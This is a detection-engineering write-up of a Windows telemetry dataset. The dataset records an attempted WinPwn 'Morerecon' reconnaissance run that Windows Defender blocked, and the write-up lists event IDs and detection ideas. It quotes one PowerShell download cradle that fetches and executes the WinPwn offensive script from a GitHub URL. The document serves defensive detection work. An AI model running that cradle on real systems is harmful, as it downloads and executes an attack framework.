# T1082-19: System Information Discovery — WinPwn - Morerecon

## Technique Context

T1082 System Information Discovery encompasses adversary activities to gather information about the victim system's configuration, hardware, software, and network settings. This reconnaissance helps attackers understand their environment and plan subsequent actions. Common methods include using built-in utilities like `systeminfo`, `whoami`, registry queries, and PowerShell cmdlets to enumerate system details.

The detection community focuses on monitoring command-line executions of system enumeration tools, PowerShell script block logging for reconnaissance activities, and behavioral patterns that indicate systematic information gathering. This technique is particularly important because it's often one of the first post-compromise activities, making it a valuable detection opportunity for early-stage threat identification.

## What This Dataset Contains

This dataset captures an attempted execution of the WinPwn framework's "Morerecon" function, which is a comprehensive system reconnaissance module. The key events show:

**Initial PowerShell execution** attempting to download and execute WinPwn:
- Security 4688: `powershell.exe` with command line containing `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
- PowerShell 4104: Script blocks showing the malicious command structure
- PowerShell 4103: `New-Object` cmdlet invocation for creating WebClient

**Windows Defender intervention**:
- PowerShell 4100: Error showing "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent`

**Limited system enumeration activity**:
- Sysmon 1: `whoami.exe` process creation with command line `"C:\Windows\system32\whoami.exe"`
- Security 4688: Corresponding process creation event for whoami
- Sysmon 22: DNS query for `raw.githubusercontent.com` resolving to GitHub's content delivery network IPs

**Network and process telemetry**:
- Multiple Sysmon 7 events showing .NET Framework and Windows Defender DLL loading
- Sysmon 10 events indicating process access attempts during PowerShell execution
- Security 4703: Token right adjustment showing privilege escalation within PowerShell

## What This Dataset Does Not Contain

The dataset lacks comprehensive system discovery telemetry because Windows Defender successfully blocked the WinPwn script execution. Missing elements include:

- **Successful WinPwn reconnaissance activities** - the framework's extensive system enumeration commands were blocked before execution
- **Registry enumeration events** - no registry access logging despite WinPwn typically performing extensive registry reconnaissance
- **File system discovery events** - limited file operations beyond PowerShell startup profile creation
- **Network discovery commands** - no evidence of network interface enumeration, ARP table queries, or network share discovery
- **Additional LOLBin executions** - the Sysmon ProcessCreate filtering captured only `whoami.exe`, but WinPwn would typically spawn numerous other system utilities

The PowerShell script block logging shows mostly error handling boilerplate and Set-ExecutionPolicy commands rather than the actual reconnaissance script content due to the early AV intervention.

## Assessment

This dataset provides excellent telemetry for detecting **attempted** malicious PowerShell-based reconnaissance rather than successful execution. The combination of command-line logging (Security 4688), PowerShell script blocks (4104), and Windows Defender blocking events (4100) creates a comprehensive view of the attack attempt and its prevention.

For detection engineering, this represents a realistic scenario where modern endpoint protection prevents technique completion but still generates valuable telemetry. The dataset is particularly strong for building detections around PowerShell download cradles, suspicious script execution attempts, and the behavioral patterns that precede system discovery activities.

The DNS query telemetry and process access events provide additional context that could be valuable for threat hunting and understanding attacker infrastructure.

## Detection Opportunities Present in This Data

1. **PowerShell download cradle detection** - Monitor Security 4688 and PowerShell 4104 events for command lines containing `iex(new-object net.webclient).downloadstring` or similar patterns targeting GitHub raw content URLs

2. **WinPwn framework indicators** - Alert on PowerShell script blocks containing references to "S3cur3Th1sSh1t" repository paths or "WinPwn" function names in command lines

3. **Suspicious GitHub raw content access** - Monitor DNS queries (Sysmon 22) for `raw.githubusercontent.com` combined with PowerShell process context, especially when followed by script execution errors

4. **Windows Defender malicious script blocking** - Create high-fidelity detections on PowerShell 4100 events with error ID `ScriptContainedMaliciousContent` as these indicate active malicious script attempts

5. **Reconnaissance tool execution patterns** - Monitor for `whoami.exe` execution (Sysmon 1) when spawned from PowerShell processes, particularly in rapid succession or combined with other enumeration tools

6. **PowerShell process access anomalies** - Alert on Sysmon 10 events showing PowerShell processes accessing newly created child processes with high privileges (0x1FFFFF), which may indicate injection or reconnaissance preparation

7. **Token privilege escalation during reconnaissance** - Monitor Security 4703 events for PowerShell processes gaining multiple high-level privileges (SeBackupPrivilege, SeSystemEnvironmentPrivilege, etc.) as this often precedes system discovery activities
